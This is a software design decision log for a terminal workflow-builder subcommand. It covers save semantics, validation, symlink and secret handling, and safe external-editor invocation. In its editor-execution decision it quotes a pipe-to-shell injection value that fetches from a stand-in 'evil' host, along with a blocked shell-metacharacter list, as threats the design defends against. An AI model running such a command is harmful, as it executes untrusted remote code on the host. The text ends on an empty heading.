# Decision Log: Workflow Builder

## D1: Subcommand name `pr9k workflow`

- **Question:** What command launches the workflow builder?
- **Decision:** The builder is invoked as `pr9k workflow` — a new cobra subcommand sibling to `pr9k sandbox create` and `pr9k sandbox login`.
- **Rationale:** The user explicitly specified this command. Follows the established subcommand pattern (sandbox create / sandbox login) and respects the narrow-reading ADR.
- **Evidence:** User input. Existing pattern at `src/cmd/pr9k/sandbox.go:80`, `src/cmd/pr9k/sandbox_create.go:19`, `src/cmd/pr9k/sandbox_login.go:16`. ADR [`docs/adr/20260409135303-cobra-cli-framework.md`](../../../adr/20260409135303-cobra-cli-framework.md).
- **Rejected alternatives:**
  - `pr9k edit` — rejected because "edit" says nothing about what is edited.
  - Flag on the root command — rejected because a full TUI differs materially from the run loop.
- **Linked technical notes:** —
- **Driven by findings:** —
- **Dependent decisions:** D3, D10, D19
- **Referenced in spec:** Actors and Triggers; Primary Flow step 1

## D2: Target selection modes

- **Question:** What options does the user have when choosing which workflow to edit?
- **Decision:** Four options on the landing page — edit the default target in place; copy the default target into the project-local workflow directory and edit the copy; edit the project-local workflow; edit a workflow at an arbitrary path.
- **Rationale:** Matches the user's stated requirements and the two-candidate workflow-directory resolution already in pr9k.
- **Evidence:** User input. Two-candidate resolver `resolveWorkflowDirWith` at `src/internal/cli/args.go:26`. ADR [`docs/adr/20260418175134-pr9k-rename-and-pr9k-layout.md`](../../../adr/20260418175134-pr9k-rename-and-pr9k-layout.md).
- **Rejected alternatives:**
  - Single target = "whatever pr9k would resolve right now" — denies agency to switch.
  - Prompt only for a path — denies discoverability.
- **Linked technical notes:** —
- **Driven by findings:** —
- **Dependent decisions:** D3, D4, D8, D15, D31, D22
- **Referenced in spec:** Primary Flow step 3; User Interactions — Affordances

## D3: Default target resolution semantics

- **Question:** What does "the default target" mean when the landing page preselects it?
- **Decision:** The default target is the directory that the main `pr9k` command would resolve for this invocation, using identical precedence: `--workflow-dir` override if set, otherwise `<projectDir>/.pr9k/workflow/`, otherwise `<executableDir>/.pr9k/workflow/`.
- **Rationale:** Keeps the builder's behavior consistent with the rest of pr9k.
- **Evidence:** User input on Q1. `resolveWorkflowDir` / `resolveWorkflowDirWith` at `src/internal/cli/args.go:26-54`. ADR [`docs/adr/20260413162428-workflow-project-dir-split.md`](../../../adr/20260413162428-workflow-project-dir-split.md).
- **Rejected alternatives:**
  - Always preselect the bundled ship path — diverges from runtime rules.
- **Linked technical notes:** —
- **Driven by findings:** —
- **Dependent decisions:** D4, D31
- **Referenced in spec:** Primary Flow step 2

## D4: Read-only default fallback

- **Question:** What happens when the default target is not writable?
- **Decision:** The landing page detects writability and, when the default target is read-only, surfaces a banner and enters browse-only mode (see D30). The writability check applies to all four target options, not only the default (extended under F-28 review).
- **Rationale:** Common when pr9k is installed via a package manager. Writability discovery must not be limited to the default target — the arbitrary-path option can also point at a read-only bundle.
- **Evidence:** User input on Q1. Go coding standard [`docs/coding-standards/go-patterns.md`](../../../coding-standards/go-patterns.md) — restrict file/directory permissions.
- **Rejected alternatives:**
  - Always write to a temporary location — violates user intent.
  - Refuse to open a read-only target — denies legitimate browse.
- **Linked technical notes:** —
- **Driven by findings:** F28
- **Dependent decisions:** D30
- **Referenced in spec:** Primary Flow step 3; Alternate Flows — Read-only target

## D5: External editor for multi-line content

- **Question:** Multi-line content — edit inside the TUI or shell out?
- **Decision:** Shell out to the user's configured external editor (see D16 for fallback policy, D33 for execution model).
- **Rationale:** No multi-line text-editor widget is in the project's existing TUI dependency stack. Shell-out is the established Unix pattern (`git commit`, `crontab -e`, `visudo`).
- **Evidence:** User input on Q2. `src/go.mod` — no `bubbles/textarea`, no `charmbracelet/huh`.
- **Rejected alternatives:**
  - Build an in-TUI multi-line editor — out of scope.
  - Pager-style read-only view — user must be able to edit.
  - Adopt `charmbracelet/huh` — overcommitment for a single-feature need.
- **Linked technical notes:** T2
- **Driven by findings:** —
- **Dependent decisions:** D16, D33
- **Referenced in spec:** Primary Flow step 7; Alternate Flows — External-editor invocation

## D6: Validation UX — fatal blocks, warnings do not

- **Question:** When does the builder validate, and what severity blocks the save?
- **Decision:** Validation runs on save against the in-memory state. Fatal findings block; warnings and info do not (the user acknowledges; see D23 for per-session suppression). Field-local input-time validation still applies to numeric ranges and simple enums.
- **Rationale:** Mirrors the validator's existing severity model.
- **Evidence:** User input on Q3. Validator severity levels at `src/internal/validator/validator.go:21-55`. `docs/code-packages/validator.md`.
- **Rejected alternatives:**
  - Continuous validation — many rules require whole-config scope.
  - Warnings block save — the runtime does not.
- **Linked technical notes:** T3
- **Driven by findings:** —
- **Dependent decisions:** D14, D23, D25, D35
- **Referenced in spec:** Primary Flow step 9; Coordinations — Workflow configuration validator

## D7: Save semantics — explicit, atomic, unsaved prompt

- **Question:** Auto-save or explicit? Atomic or direct? Quit-with-unsaved behavior?
- **Decision:** Explicit save. Atomic at the file level (see T1). Quit with unsaved changes invokes a three-way confirmation dialog (save/discard/cancel). No auto-save, no undo history.
- **Rationale:** The editor is the canonical editing path and deserves crash-safe writes. Explicit matches the validator integration.
- **Evidence:** User input on Q4. Existing write patterns at `src/internal/workflow/iterationlog.go:47` and `src/internal/claudestream/rawwriter.go:29` — no atomic-rename pattern in the codebase today.
- **Rejected alternatives:**
  - Auto-save on every keystroke.
  - Direct `O_TRUNC` overwrite.
  - `.bak` sibling.
- **Linked technical notes:** T1
- **Driven by findings:** —
- **Dependent decisions:** D40
- **Referenced in spec:** Primary Flow steps 9 and 10; Alternate Flows — Unsaved-changes quit

## D8: Scaffold or copy or cancel for empty folder

- **Question:** When the user selects a target folder that has no configuration file, what does the builder do?
- **Decision:** Three actions — scaffold a minimal valid workflow; copy from the default target; cancel.
- **Rationale:** User input on Q5.
- **Evidence:** User input on Q5. Minimum-phase-size rule at `src/internal/validator/validator.go` (category 3).
- **Rejected alternatives:**
  - Require existing file.
  - Silent scaffold.
- **Linked technical notes:** —
- **Driven by findings:** —
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 4; Alternate Flows — Scaffold-from-empty

## D9: v1 scope boundary

- **Question:** What is out of scope for v1?
- **Decision:** v1 does not run workflows, dry-run steps, import from URLs / git, diff, lock across sessions, syntax-highlight, perform version-control operations, migrate older schemas, or embed step templates.
- **Rationale:** User input on Q6. Each excluded capability is a substantial feature; bundling dilutes the editing value.
- **Evidence:** User input on Q6. Narrow-reading ADR [`docs/adr/20260410170952-narrow-reading-principle.md`](../../../adr/20260410170952-narrow-reading-principle.md).
- **Rejected alternatives:**
  - Include dry-run.
  - Include diff-against-default.
- **Linked technical notes:** —
- **Driven by findings:** —
- **Dependent decisions:** D18, D41
- **Referenced in spec:** Out of Scope

## D10: Editor does not run or coordinate with orchestrator

- **Question:** Does the builder interact with a running pr9k orchestrator?
- **Decision:** No. The builder is a distinct subcommand with its own TUI program lifecycle.
- **Rationale:** User input on Q7. Clean subcommand separation matches the sandbox-subcommand precedent.
- **Evidence:** User input on Q7. Sandbox subcommand separation at `src/cmd/pr9k/sandbox.go:80`.
- **Rejected alternatives:**
  - Attach to a running orchestrator.
  - Signal an orchestrator after save.
- **Linked technical notes:** —
- **Driven by findings:** —
- **Dependent decisions:** D41
- **Referenced in spec:** Edge Cases — another pr9k process; Coordinations — Main pr9k orchestrator; Out of Scope

## D11: No Ralph-specific knowledge in the builder

- **Question:** Should the builder know anything Ralph-specific?
- **Decision:** No. The builder is a pure schema editor. It knows the `config.json` schema (owned by Go's validator) but does not hardcode step templates, prompt paths, script paths, or capture-variable names. The three phase names (`initialize`/`iteration`/`finalize`) are explicitly named by the narrow-reading ADR as owned by pr9k Go code — rendering them in the outline is an expression of that ownership, not a violation of it.
- **Rationale:** The narrow-reading ADR makes this the default posture. D11 is grounded in the ADR's "pr9k owns" list.
- **Evidence:** ADR [`docs/adr/20260410170952-narrow-reading-principle.md`](../../../adr/20260410170952-narrow-reading-principle.md) "pr9k owns" vs "Config owns" split.
- **Rejected alternatives:**
  - Step-template gallery — requires amending the ADR.
  - `--ralph` flag.
- **Linked technical notes:** —
- **Driven by findings:** F20
- **Dependent decisions:** —
- **Referenced in spec:** Out of Scope (final bullet)

## D12: Constrained fields as choice lists; model as free text with suggestions

- **Question:** How is each field type rendered?
- **Decision:** Fixed-value fields render as choice lists offering only valid values. Numeric fields enforce ranges at input. Plain-text fields have input hints. `model` is free-text with a suggestion list because the schema does not constrain it.
- **Rationale:** User asked explicitly for constrained lists. The builder must not reject a value the runtime would accept.
- **Evidence:** User input. Constrained-value catalog at `src/internal/validator/validator.go`: `captureMode` (406–416), `onTimeout` (459–499), `statusLine.type` (261–263). Model not validated (371–372).
- **Rejected alternatives:**
  - `model` as a fixed list.
  - All fields as free text.
- **Linked technical notes:** —
- **Driven by findings:** —
- **Dependent decisions:** D27
- **Referenced in spec:** Primary Flow step 7

## D13: Keyboard and mouse both supported

- **Question:** What input modalities does the builder support?
- **Decision:** Keyboard and mouse are both first-class. Every action is reachable by both.
- **Rationale:** User stated explicitly "mouse and keyboard integration".
- **Evidence:** User input. Existing mouse handling at `src/internal/ui/model.go:217`. `tea.WithMouseCellMotion()` at `src/cmd/pr9k/main.go:174`.
- **Rejected alternatives:**
  - Keyboard-only v1.
- **Linked technical notes:** —
- **Driven by findings:** —
- **Dependent decisions:** D34
- **Referenced in spec:** Primary Flow step 7; User Interactions — Affordances

## D14: Reuse existing validator

- **Question:** Does the builder write a new validator or reuse the existing one?
- **Decision:** Reuse the existing validator. The builder passes its in-memory state to the same validator the main command uses.
- **Rationale:** Avoids the "editor said fine but pr9k rejected it" failure mode. ADR narrow-reading says pr9k owns schema validation.
- **Evidence:** `src/internal/validator/validator.go`. `docs/code-packages/validator.md`.
- **Rejected alternatives:**
  - Builder-local validator.
  - Partial validation.
- **Linked technical notes:** T3
- **Driven by findings:** F30
- **Dependent decisions:** D21
- **Referenced in spec:** Primary Flow step 9; Coordinations — Workflow configuration validator

## D15: Companion-file copy scope

- **Question:** When copying the default target, which companion files get copied?
- **Decision:** Configuration file, every prompt file referenced by any step, every script file referenced by any step. Unreferenced files are not copied.
- **Rationale:** Avoids surprising the user with orphan files.
- **Evidence:** Default bundle layout at `workflow/`. Narrow-reading ADR — config is the source of truth.
- **Rejected alternatives:**
  - Copy full directory tree.
  - Copy only the config file.
- **Linked technical notes:** —
- **Driven by findings:** F13
- **Dependent decisions:** D32
- **Referenced in spec:** Alternate Flows — Copy-default-to-local

## D16: External editor fallback policy

- **Question:** When neither `$VISUAL` nor `$EDITOR` is set, does the builder silently fall back to a default editor?
- **Decision:** No silent fallback. When neither is set, the builder shows a dialog with the file's absolute path and a copy-pasteable `export VISUAL=nano` instruction. Users can close the dialog and continue editing non-multi-line fields.
- **Rationale:** Silent fallback to `vi` traps users who do not know the exit sequence. An explicit dialog is kinder for new users on minimal installs.
- **Evidence:** User input on Q-A. UX finding UX-009 / DevOps Finding 8: the spec's earlier language was contradictory — "safe fallback if neither is set" conflicted with the "no external editor configured" alternate flow.
- **Rejected alternatives:**
  - Hard fallback to `vi` — traps vi-unfamiliar users.
  - Probe `nano` / `vi` in order — introduces surprise-editor failure modes on minimal containers.
- **Linked technical notes:** —
- **Driven by findings:** F9
- **Dependent decisions:** D33
- **Referenced in spec:** Primary Flow step 7; Alternate Flows — External-editor invocation, No external editor configured

## D17: Symlink policy — follow with visibility

- **Question:** How does the builder handle symlinks in the target directory and its companion files?
- **Decision:** Follow symlinks (matching the existing `src/internal/cli/args.go` precedent for `--workflow-dir` and `--project-dir`), and display a "symlink banner" during the session naming each affected path. The first save requires explicit confirmation. Saves to a symlinked configuration file write through the symlink to its target rather than replacing the symlink with a regular file.
- **Rationale:** User input on Q-B. Rejecting symlinks would break legitimate uses (a user who symlinks their bundle into `.pr9k/workflow/` from elsewhere). Silent following creates an invisible attack surface. Visibility-plus-confirmation balances the two.
- **Evidence:** User input on Q-B. `EvalSymlinks` usage at `src/internal/cli/args.go:50, 100, 118`. Security-F4. Edge-case 3-A, 3-E, 4-D.
- **Rejected alternatives:**
  - Reject symlinks that escape the tree.
  - Follow silently.
- **Linked technical notes:** T1 (follow-symlink save semantics)
- **Driven by findings:** F38, F27, F26
- **Dependent decisions:** —
- **Referenced in spec:** Alternate Flows — Symlinked target or companion file; Edge Cases table (target config file is a symlink)

## D18: Unknown fields — warn on load, drop on save

- **Question:** What does the builder do when `config.json` contains fields the builder's schema model does not recognize?
- **Decision:** At load, surface a non-blocking banner listing unrecognized fields and warning that saving will remove them. At save, write only fields the builder knows about — unrecognized fields are dropped.
- **Rationale:** User chose option B from Q-C. Preserving unknowns (option A) would require an "extras" bag in the in-memory model and round-trip guarantees the builder cannot reliably validate. Blocking save (option C) would paralyze the user on any schema drift. The warn-then-drop model keeps the user informed without forcing them to reason about fields they did not author.
- **Evidence:** User input on Q-C. DevOps Finding 6.
- **Rejected alternatives:**
  - Preserve unknowns through load/save (option A) — adds in-memory state not otherwise needed.
  - Block save on unknowns (option C) — disproportionate to the risk.
- **Linked technical notes:** —
- **Driven by findings:** F44
- **Dependent decisions:** —
- **Referenced in spec:** Alternate Flows — Unknown-field warning; Out of Scope

## D19: Subcommand flag surface

- **Question:** Which root-command flags does `pr9k workflow` accept?
- **Decision:** `--workflow-dir` and `--project-dir`, with identical semantics to the main command. The subcommand does not accept `--iterations` (meaningless outside a run) or any other run-scoped flag. `--version` and `-h`/`--help` are handled by cobra globally and remain available.
- **Rationale:** Target resolution depends on these two flags; run-time flags do not apply to editing.
- **Evidence:** Existing flags at `src/internal/cli/args.go` and `docs/features/cli-configuration.md`.
- **Rejected alternatives:**
  - Inherit all root flags — `--iterations` would be nonsense.
  - New subcommand-local flag set — unnecessary divergence.
- **Linked technical notes:** —
- **Driven by findings:** F19
- **Dependent decisions:** —
- **Referenced in spec:** Actors and Triggers

## D20: containerEnv secret masking

- **Question:** How does the builder display container-environment values whose key names match secret patterns?
- **Decision:** Mask by default with a reveal toggle per field. Secret-key patterns match the existing validator list: keys ending in `_TOKEN`, `_SECRET`, `_KEY`, `_PASSWORD`, `_PASSPHRASE`, `_CREDENTIAL`, `_APIKEY`. Findings-panel entries for secret-named keys never echo the value.
- **Rationale:** User input on Q-D, option A. Defense in depth: the validator already warns that literal values end up committed to the repo; masking the value on screen avoids shoulder-surfing and inadvertent inclusion in screenshots or screen shares. Reveal-on-demand preserves editability.
- **Evidence:** User input on Q-D. Secret-pattern list at `src/internal/validator/validator.go:236-244`. Security-F3.
- **Rejected alternatives:**
  - Mask only when warning fires — timing is too late; the value is already visible.
  - Never mask.
- **Linked technical notes:** —
- **Driven by findings:** F37
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 7

## D21: Script executability validation

- **Question:** Does the builder (or the validator) enforce that referenced scripts are executable and have a valid shebang?
- **Decision:** Extend the validator with a new category: every referenced script must be a regular file, must be executable, and must begin with a `#!` shebang (or be an OS-native executable format). Violation is fatal. When the only problem is a missing execute bit and the file has a valid shebang, the builder's detail pane offers a "mark executable and continue" action that sets the execute bit for the user, then re-runs validation.
- **Rationale:** User input on Q-E (option A with chmod offer). The existing validator only checks that the path exists, so a non-executable script passes validation and fails at runtime — silent misbehavior. Treating executability as a schema-level rule (owned by the validator) is narrow-reading-friendly. The chmod offer removes friction for the common case where the user forgot to set the bit.
- **Evidence:** User input on Q-E. Existing `validateCommandPath` at `src/internal/validator/validator.go:641-659` — currently checks existence only. Edge-case 3-B, 3-F.
- **Rejected alternatives:**
  - Builder-local check, validator unchanged — creates drift.
  - No check — keeps the silent misbehavior.
- **Linked technical notes:** —
- **Driven by findings:** F26
- **Dependent decisions:** —
- **Referenced in spec:** Edge Cases table (script row)

## D22: External-workflow warning

- **Question:** When the target directory is outside the user's project and home, does the builder treat it differently?
- **Decision:** Yes. Display an "external workflow" banner during the entire session. At the first save, prompt for explicit confirmation with the absolute path. Subsequent saves in the same session do not re-confirm.
- **Rationale:** User input on Q-G (option A). A workflow the user later runs executes scripts on the host with the user's privileges; editing an attacker-placed workflow at `/tmp/evil/` should be visibly distinct from editing one's own.
- **Evidence:** User input on Q-G. Security-F1. Existing `resolveProjectDir` at `src/internal/cli/args.go:59`.
- **Rejected alternatives:**
  - Banner only — insufficient for the save action itself.
  - No visible treatment — denies the user informed consent.
- **Linked technical notes:** —
- **Driven by findings:** F35
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 3; Alternate Flows — External-workflow session

## D23: Per-session warning suppression

- **Question:** Does every save with the same warning force a fresh acknowledgment?
- **Decision:** No. A warning or info finding acknowledged during a session is not surfaced again at the acknowledgment dialog for the remainder of the session. The finding continues to appear in the findings panel when the user opens it manually.
- **Rationale:** User input on Q-H (option A). Repeated acknowledgment of the same non-fatal warning trains users to click through without reading — a classic warning-fatigue failure. Matching the runtime (warnings print once at startup) keeps user expectations aligned.
- **Evidence:** User input on Q-H. UX-017.
- **Rejected alternatives:**
  - Always require acknowledgment — dark-pattern territory.
- **Linked technical notes:** —
- **Driven by findings:** F16
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 9

## D24: Help modal and shortcut footer

- **Question:** How does the user discover the builder's keyboard shortcuts?
- **Decision:** A persistent **shortcut footer** in every edit-view mode shows the shortcuts available in the current focus. A **help modal** is unconditionally reachable via `?` from any edit-view mode (not gated on status-line configuration).
- **Rationale:** UX-002 and UX-015. The existing TUI's `?` gate on `statusLineActive` is already a defect; the builder must not inherit it. A richer editor with many shortcuts needs an always-available discovery surface.
- **Evidence:** UX findings UX-002, UX-015. Existing shortcut constants at `src/internal/ui/ui.go:35-44`.
- **Rejected alternatives:**
  - Gate `?` on some other condition.
  - Documentation-only shortcut list.
- **Linked technical notes:** —
- **Driven by findings:** F2
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow steps 5 and 8; User Interactions — Feedback

## D25: Severity text prefixes

- **Question:** How is finding severity conveyed to users with color-vision limitations or color-stripping terminals?
- **Decision:** Every finding in the findings panel carries a text-mode severity prefix — `[FATAL]`, `[WARN]`, `[INFO]` — alongside any color. Severity is never conveyed by color alone.
- **Rationale:** Universal Design Principle 4. UX-001 and Security-F6.
- **Evidence:** Existing marker-glyph pattern for step state at `src/internal/ui/header.go:242-256` — color plus glyph.
- **Rejected alternatives:**
  - Color-only.
  - Glyph-only.
- **Linked technical notes:** —
- **Driven by findings:** F1
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 9

## D26: Initial cursor focus

- **Question:** Which item is focused when the edit view first opens?
- **Decision:** The cursor is placed on the first step of the iteration phase. If the iteration phase is empty, the cursor is placed on the iteration phase header itself.
- **Rationale:** Iteration is the most-edited phase (the Ralph loop operates entirely in iteration). UX-004.
- **Evidence:** UX-004.
- **Rejected alternatives:**
  - No initial focus.
  - Focus on the first section header regardless.
- **Linked technical notes:** —
- **Driven by findings:** F4
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 6

## D27: Unfocused field signifiers

- **Question:** How are constrained fields distinguishable from free-text fields when unfocused?
- **Decision:** Constrained fields render with a trailing `▾` glyph next to their current value. Free-text and free-text-with-suggestions fields render without the glyph.
- **Rationale:** UX-007. Single-glyph recognition cue avoids forcing the user to focus each field to learn its type.
- **Evidence:** UX-007.
- **Rejected alternatives:**
  - Distinguish only when focused.
  - Use a label prefix.
- **Linked technical notes:** —
- **Driven by findings:** F7
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 7

## D28: Collapsible section behavior

- **Question:** How does the outline's collapsible sections behave?
- **Decision:** All sections start expanded on first load of the edit view. The item count chip on each section header is always visible. Collapsing a section with the cursor inside moves the cursor to the section header. The detail pane shows a section summary (counts, top-level field values) when a section header is focused. Collapse state persists for the duration of the session but not across sessions.
- **Rationale:** UX-012. Predictable state transitions on a wayfinding affordance.
- **Evidence:** UX-012.
- **Rejected alternatives:**
  - Collapse state persisted across sessions — per-user preference complexity not justified in v1.
  - Initial state collapsed — defeats discoverability.
- **Linked technical notes:** —
- **Driven by findings:** F12
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 5

## D29: Outline scrollability

- **Question:** How does the outline handle more items than fit in the viewport?
- **Decision:** The outline is independently scrollable with a visible scroll-position indicator when content exceeds viewport height. Keyboard navigation (arrow keys) auto-scrolls to keep the focused item visible.
- **Rationale:** UX-016. A workflow with many steps outgrows the viewport; silently truncated content is a severe visibility failure.
- **Evidence:** UX-016. Existing viewport pattern at `src/internal/ui/log_panel.go:39` (bubbles/viewport).
- **Rejected alternatives:**
  - Pagination with explicit page controls — less smooth than continuous scroll.
  - Unbounded rendering — breaks on tall workflows.
- **Linked technical notes:** —
- **Driven by findings:** F15
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 5

## D30: Read-only targets open in browse-only mode

- **Question:** When a target is read-only, is it opened for edit (with save disabled) or for browse (with edit hidden)?
- **Decision:** Browse-only mode. The edit view opens with the same layout as the editable view, but the save affordance is absent (not merely greyed out), unsaved-change tracking is disabled, and the session header shows a prominent "read-only" indicator.
- **Rationale:** Jr-F3. Offering an edit affordance that cannot succeed at save time is a broken promise; hiding it is clearer. The user can still copy-to-local to gain write access.
- **Evidence:** Jr-F3.
- **Rejected alternatives:**
  - Edit-with-disabled-save.
  - Refuse to open.
- **Linked technical notes:** —
- **Driven by findings:** F18
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 3; Alternate Flows — Read-only target

## D31: Landing page duplicate-option suppression

- **Question:** When two landing-page options resolve to the same directory, does the builder show both?
- **Decision:** No. When two options resolve to identical paths, the builder collapses them, showing only the more specific option label. A "show all options" affordance remains available for users who want to see the full set.
- **Rationale:** UX-003. Duplicate options are friction; in the no-flags-no-project case, options 2 and 3 often resolve to the same target.
- **Evidence:** UX-003.
- **Rejected alternatives:**
  - Always show all four — Hick's Law cost with ambiguous meaning.
  - Hide without a way to recover — expert users want the full menu.
- **Linked technical notes:** —
- **Driven by findings:** F3
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 3

## D32: Copy progress and partial-failure handling

- **Question:** What does the user see during the copy-default-to-local operation, and what happens if it fails part-way?
- **Decision:** Display a brief status indicator during the copy. If any file fails to copy (permission denied, disk full), roll back the partial copy and return to the landing page with an error message naming the failed file and reason. Do not enter edit view with a partial bundle.
- **Rationale:** UX-013. A partial copy manifesting as "referenced prompt file not found" in the detail pane would confuse the user who just selected the copy path to get a complete bundle.
- **Evidence:** UX-013.
- **Rejected alternatives:**
  - Silent copy with no feedback.
  - Enter edit view with a partial bundle.
- **Linked technical notes:** —
- **Driven by findings:** F13
- **Dependent decisions:** —
- **Referenced in spec:** Alternate Flows — Copy-default-to-local

## D33: Editor execution model

- **Question:** How is the `$VISUAL` / `$EDITOR` value parsed and invoked?
- **Decision:** Parse the value with shell-style word splitting (first token is the command, remaining tokens are arguments). Reject values containing shell metacharacters (`$`, backticks, `;`, `|`, `&`, `<`, `>`, newline). Reject relative paths that are not resolvable via `PATH` to an existing executable. Invoke the editor directly via the OS exec mechanism, not via `sh -c`.
- **Rationale:** Security-F2. Direct exec with whitespace-split handles the realistic case (`VISUAL="code --wait"`) without introducing shell injection. Rejecting metacharacters and non-PATH relative paths closes off the two principal attack vectors (`VISUAL="curl http://evil | sh"` and `VISUAL="./planted-binary"`).
- **Evidence:** Security-F2. Edge-case 5-A, 5-E.
- **Rejected alternatives:**
  - `sh -c $VISUAL "$@"` — command injection surface.
  - Treat whole value as program name — breaks common `VISUAL="vim -u NONE"` pattern.
- **Linked technical notes:** —
- **Driven by findings:** F36
- **Dependent decisions:** —
- **Referenced in spec:** Alternate Flows — External-editor invocation, Editor binary cannot be spawned

## D34: Step reorder UX

- **Question:** How does the user discover and perform step reordering?
- **Decision:** Each step row in the outline shows a persistent gripper glyph (`⠿`) at its left edge. Keyboard reorder is `Alt+↑` and `Alt+↓`, documented in the shortcut footer whenever a step row is focused. Mouse drag on the gripper glyph (or anywhere on the row) also reorders. Cross-phase drag is not supported — dragging a step past a phase boundary visibly drops it at the phase's edge.
- **Rationale:** UX-005. Persistent glyph makes draggability discoverable without hover. `Alt+↑/↓` mirrors common editor conventions (VS Code, JetBrains). Cross-phase move is deferred to avoid the semantic landmines (scope changes to `captureAs` bindings, phase-dependent constraints like `breakLoopIfEmpty`).
- **Evidence:** UX-005, Edge-case 8-B.
- **Rejected alternatives:**
  - Hover-only gripper — invisible in terminals.
  - Single-key reorder (`[`/`]`) — collides with text-input fields.
  - Allow cross-phase drag — scope creep and semantic trap for the user.
- **Linked technical notes:** —
- **Driven by findings:** F5, F32
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 7; User Interactions — Affordances

## D35: Findings panel lifecycle

- **Question:** What happens to the findings panel after the user jumps to a field and fixes a fatal finding?
- **Decision:** The panel stays visible as a sidebar while the user edits. Jumping to a field from the panel moves focus to the edit view; the panel stays open. Every subsequent save rebuilds the panel from the new validator output. When all fatals are resolved and save succeeds, the panel closes automatically. The user can also dismiss the panel manually at any time.
- **Rationale:** UX-006. Closing the panel after jump or forcing a new save-invocation round trip adds friction; staying open while the user fixes findings is the lower-effort loop.
- **Evidence:** UX-006.
- **Rejected alternatives:**
  - Panel closes on jump.
  - Panel must be re-opened to see progress.
- **Linked technical notes:** —
- **Driven by findings:** F6
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 9

## D36: Parse-error recovery reload

- **Question:** After the user fixes a parse error via the external editor, does the builder automatically attempt to reload?
- **Decision:** Yes. After a successful external-editor invocation from the recovery view, the builder automatically re-parses the file. If parsing succeeds, the builder transitions directly to the edit view. If parsing still fails, the builder stays in the recovery view with the updated parse-error details.
- **Rationale:** UX-010. Forcing the user through landing-page round-trip to fix a typo is punishing.
- **Evidence:** UX-010.
- **Rejected alternatives:**
  - Require manual reload action.
  - Require full landing-page round-trip.
- **Linked technical notes:** —
- **Driven by findings:** F10
- **Dependent decisions:** —
- **Referenced in spec:** Alternate Flows — Parse-error recovery

## D37: Version bump

- **Question:** What version bump does this feature require?
- **Decision:** Shipping the `pr9k workflow` subcommand is a backwards-compatible addition to the CLI surface. Per `docs/coding-standards/versioning.md` section on 0.y.z, backwards-compatible CLI additions bump the patch version. The feature PR must also include the version bump commit.
- **Rationale:** DevOps Finding 1 / Jr-F6. The subcommand name becomes part of pr9k's public API; downstream tooling gating on a minimum pr9k version needs a version to gate on.
- **Evidence:** `docs/coding-standards/versioning.md` — 0.y.z rules. `src/internal/version/version.go` is the single source of truth.
- **Rejected alternatives:**
  - Minor bump — reserved for schema-breaking additions under 0.y.z.
  - No bump — hides the surface change from downstream gating.
- **Linked technical notes:** —
- **Driven by findings:** F21
- **Dependent decisions:** —
- **Referenced in spec:** Versioning

## D38: Documentation obligations

- **Question:** What documentation must ship with this feature?
- **Decision:** The feature PR includes: `docs/features/workflow-builder.md`; `docs/how-to/using-the-workflow-builder.md`; `docs/how-to/configuring-external-editor-for-workflow-builder.md`; an ADR recording the atomic-rename save pattern (new to the codebase); a `docs/code-packages/` entry for each new Go package; updates to `docs/features/cli-configuration.md` covering the new subcommand; updates to `CLAUDE.md` linking every new doc; updates to `docs/architecture.md` if new top-level packages are introduced.
- **Rationale:** `docs/coding-standards/documentation.md` — docs must ship with the feature, not as follow-up PRs. DevOps Finding 2 / Jr-F7.
- **Evidence:** `docs/coding-standards/documentation.md`.
- **Rejected alternatives:**
  - Defer docs to follow-up PR.
- **Linked technical notes:** —
- **Driven by findings:** F22
- **Dependent decisions:** —
- **Referenced in spec:** Documentation Obligations

## D39: Shared-install visibility and observability

- **Question:** How does the builder make shared-install mutations and session outcomes visible?
- **Decision:** When saving to a directory not owned by the current user, the session header shows a "shared install" banner alerting the user that the save will affect other users of the same pr9k install. Builder session events (session start with chosen target, saves with their outcomes, external-editor invocations with exit codes, quits) are logged to the same `.pr9k/logs/` location the main `pr9k` already uses.
- **Rationale:** Security-F7 / DevOps Finding 4 (multi-user case) and DevOps Finding 5 (observability gap). A single logging surface keeps diagnosis tooling consistent across run-time and edit-time.
- **Evidence:** Security-F7, DevOps-5. Existing logger at `src/internal/logger/`.
- **Rejected alternatives:**
  - No logging — denies debuggability.
  - Separate log file — duplicates infrastructure.
- **Linked technical notes:** —
- **Driven by findings:** F39, F43
- **Dependent decisions:** —
- **Referenced in spec:** Edge Cases table (shared-install row); Coordinations — Session log

## D40: Unsaved-quit compound state

- **Question:** What happens when the user picks "save" in the unsaved-changes-quit dialog and the save surfaces fatal findings?
- **Decision:** Dismiss the quit dialog, return the user to the edit view with the findings panel open, and cancel the quit. Escape in the dialog is equivalent to cancel.
- **Rationale:** UX-011. The save-from-quit path has a real compound state the spec must describe.
- **Evidence:** UX-011.
- **Rejected alternatives:**
  - Leave the dialog open over the findings panel.
  - Quit-without-saving despite fatals.
- **Linked technical notes:** —
- **Driven by findings:** F11
- **Dependent decisions:** —
- **Referenced in spec:** Primary Flow step 10; Alternate Flows — Unsaved-changes quit

## D41: Cross-session mutation detection

- **Question:** How does the builder detect and communicate concurrent or intervening changes to the configuration file?
- **Decision:** On load, snapshot the configuration file's modification time and size. At save, re-stat the file; if the values have changed, show a conflict dialog naming the mismatch with three actions: overwrite with the builder's in-memory state, reload from disk and discard in-memory edits, or cancel the save. Last-completed-save wins when two builder sessions save simultaneously — the mtime snapshot catches only on-disk changes, not a concurrent builder session that has not yet saved.
- **Rationale:** Edge-case 10-A. Full cross-process locking is out of scope (D9), but a best-effort collision signal is much better than silent overwrite.
- **Evidence:** Edge-case 10-A, Security-F9.
- **Rejected alternatives:**
  - Multi-session locking — out of scope.
  - No detection — silent overwrite.
- **Linked technical notes:** T1
- **Driven by findings:** F34, F41
- **Dependent decisions:** —
- **Referenced in spec:** Edge Cases table; Out of Scope

## D41-b: Test strategy for T1, T2, and TUI modes

